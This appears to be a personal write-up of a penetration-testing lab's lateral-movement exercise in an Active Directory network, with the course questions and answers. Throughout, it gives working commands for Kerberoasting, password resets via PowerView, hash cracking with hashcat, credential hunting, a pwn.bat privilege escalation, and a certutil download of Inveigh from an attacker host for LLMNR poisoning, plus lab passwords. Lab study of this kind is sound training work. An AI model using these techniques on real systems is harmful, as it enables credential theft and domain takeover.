# [Lateral Movement](Lateral%20Movement.md)
### Find a backup script that contains the password for the backupadm user. Submit this user's password as your answer.

Upload [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) on web server, remember to modify `Allowable File Extensions`
![](Screenshot%202026-09-03%20at%2021.30.57.png)
![](Screenshot%202026-09-03%20at%2021.52.27.png)

Then you RDP into `hporter:Gr8hambino!`
```shell
xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino!
```

```powershell
Import-Module .\PowerView.ps1

Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Str0ngpass86!' -AsPlainText -Force ) -Verbose
```
![](Screenshot%202026-09-06%20at%2013.37.39.png)

```shell
proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares'
```
![](Screenshot%202026-09-06%20at%2014.04.21.png)
![](Screenshot%202026-09-06%20at%2014.06.02.png)

___
### Perform a Kerberoasting attack and retrieve TGS tickets for all accounts set as SPNs. Crack the TGS of the backupjob user and submit the cleartext password as your answer.

```powershell
Get-DomainUser * -SPN |Select samaccountname
```
![](Screenshot%202026-09-06%20at%2014.07.41.png)

```powershell
Get-DomainUser * -SPN -verbose | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
```
![](Screenshot%202026-09-06%20at%2014.09.09.png)

Added .csv into `Allowable File Extensions`
![](Screenshot%202026-09-06%20at%2014.14.38.png)

Refresh and then we get ilfreight_spins.csv
![](Screenshot%202026-09-06%20at%2014.15.04.png)

Cat and grep a hash
![](Screenshot%202026-09-06%20at%2014.17.14.png)

```shell
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```
![](Screenshot%202026-09-06%20at%2014.18.24.png)

___
### Escalate privileges on the MS01 host and submit the contents of the flag.txt file on the Administrator Desktop.

```shell
proxychains evil-winrm -i 172.16.8.50 -u backupadm -p '!qazXSW@'
```
![](Screenshot%202026-09-06%20at%2014.24.21.png)

```powershell
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Force | Select-String -Pattern "password" -CaseSensitive:$false -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path -Unique
```
![](Screenshot%202026-09-06%20at%2014.34.27.png)

```shell
cat C:\panther\unattend.xml
```
![](Screenshot%202026-09-06%20at%2014.35.19.png)

```powershell
net user ilfserveradm
```
![](Screenshot%202026-09-06%20at%2014.35.58.png)

Let's RDP
```shell
proxychains xfreerdp /v:172.16.8.50 /u:ilfserveradm /p:Sys26Admin /dynamic-resolution
```


![](Screenshot%202026-09-06%20at%2014.56.33.png)

![](Screenshot%202026-09-06%20at%2015.04.40.png)
![](Screenshot%202026-09-06%20at%2015.09.08.png)

Put pwn.bat into the box
![](Screenshot%202026-09-06%20at%2014.58.55.png)

So whenever we create a new file `pwn.bat` gonna be executed
![](Screenshot%202026-09-06%20at%2015.21.43.png)

Now just restart the target
```cmd
logoff
```

We're free now, remember to `Run as Administrator`
![](Screenshot%202026-09-06%20at%2015.33.47.png)

___
### Obtain the NTLMv2 password hash for the mpalledorous user and crack it to reveal the cleartext value. Submit the user's password as your answer.

Uploaded Inveigh.ps1
```cmd
certutil.exe -urlcache -split -f http://172.16.8.120:20000/Inveigh.ps1 Inveigh.ps1
```
![](Screenshot%202026-09-06%20at%2015.45.41.png)

```powershell
Import-Module .\Inveigh.ps1

Invoke-Inveigh -NBNS Y -LLMNR Y -HTTP Y -HTTPS Y -SMB Y -ConsoleOutput Y -FileOutput Y
```
![](Screenshot%202026-09-06%20at%2015.54.17.png)

```shell
hashcat -m 5600 hash2.txt /usr/share/wordlists/rockyou.txt
```
![](Screenshot%202026-09-06%20at%2015.55.27.png)
